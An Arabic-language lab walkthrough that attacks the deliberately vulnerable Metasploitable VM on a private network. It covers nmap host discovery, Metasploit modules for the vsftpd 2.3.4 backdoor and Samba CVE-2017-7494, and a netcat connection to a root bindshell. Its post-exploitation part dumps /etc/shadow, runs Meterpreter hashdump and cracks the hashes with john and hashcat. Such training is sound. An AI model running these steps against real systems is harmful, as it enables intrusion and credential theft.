📡 PHASE 1

Host Discovery — أين الهدف؟

أول خطوة: نعرف الـ IP بتاع الـ Metasploitable على الشبكة.

ip addr # شوف IP جهازك (Kali) الأول
→ لو IP جهازك: 192.168.56.101
→ الشبكة هي: 192.168.56.0/24
nmap -sn 192.168.56.0/24 # Ping Sweep — دور على الأجهزة الشغالة
# المخرجات:
Nmap scan report for 192.168.56.102
Host is up (0.00042s latency).
MAC Address: 08:00:27:XX:XX:XX (VirtualBox)
✅ اكتشفنا الهدف! IP الـ Metasploitable: 192.168.56.102

💥 PHASE 5

Exploitation — وقت الهجوم! 😈

🎯 هجوم 1: vsftpd 2.3.4 Backdoor الأسهل والأسرع

هذه الثغرة تاريخها طريف — شخص أضاف Backdoor داخل كود المصدر الأصلي لـ vsftpd على السيرفر الرسمي لفترة قصيرة. أي شخص حمّل النسخة الملوثة لديه Backdoor مخفي!

Step 1:
msfconsole
Step 2:
use exploit/unix/ftp/vsftpd_234_backdoor
Step 3:
show options
Step 4:
set RHOSTS 192.168.56.102
Step 5:
run
[*] Banner: 220 (vsFTPd 2.3.4)
[*] USER: 331 Please specify the password.
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened! 🔥
🎯 هجوم 2: Bindshell على Port 1524 أسرع هجوم ممكن 😂

Metasploitable عنده Port 1524 مفتوح وشغّال Root Shell مباشرة — بدون أي Exploit!

nc -nv 192.168.56.102 1524
(UNKNOWN) [192.168.56.102] 1524 (ingreslock) open
root@metasploitable:/# whoami
root
root@metasploitable:/#
💡 ده مش Exploit — ده إعداد خاطئ (Misconfiguration). بيوضح إن الأخطار مش دايماً تحتاج Exploits معقدة!
🎯 هجوم 3: Samba EternalRed (CVE-2017-7494) أقوى من EternalBlue

نفس عيلة EternalBlue لكن على Linux. يستغل ثغرة في Samba لتنفيذ كود كـ root.

Step 1:
use exploit/linux/samba/is_known_pipename
Step 2:
set RHOSTS 192.168.56.102
Step 3:
set LHOST 192.168.56.101 # IP جهازك
Step 4:
run
👑 PHASE 6

Post-Exploitation — دخلنا، إيه اللي بعده؟

بعد الحصول على الـ Shell، يبدأ الجزء الحقيقي — جمع البيانات وتثبيت الوجود.

🔍 جمع المعلومات
whoami # من أنا؟
id # UID وGroups
uname -a # معلومات النظام
cat /etc/passwd # كل المستخدمين
cat /etc/shadow # الهاشات! (root only)
📂 استكشاف النظام
ls -la /home/ # مجلدات المستخدمين
find / -name "*.txt" 2>/dev/null # دور على ملفات
ps aux # البروسيسات الشغالة
netstat -antup # الاتصالات
🔑 Meterpreter (لو استخدمته)
hashdump # سحب كل الهاشات
getsystem # رفع الصلاحيات
run post/linux/gather/hashdump # Linux hashdump
download /etc/shadow . # نسخ الملف
💣 كسر الهاشات (بعد hashdump)
john --wordlist=rockyou.txt shadow_file
hashcat -m 1800 shadow_file rockyou.txt # SHA-512
msfadmin : msfadmin ← نفس اسم اليوزر!
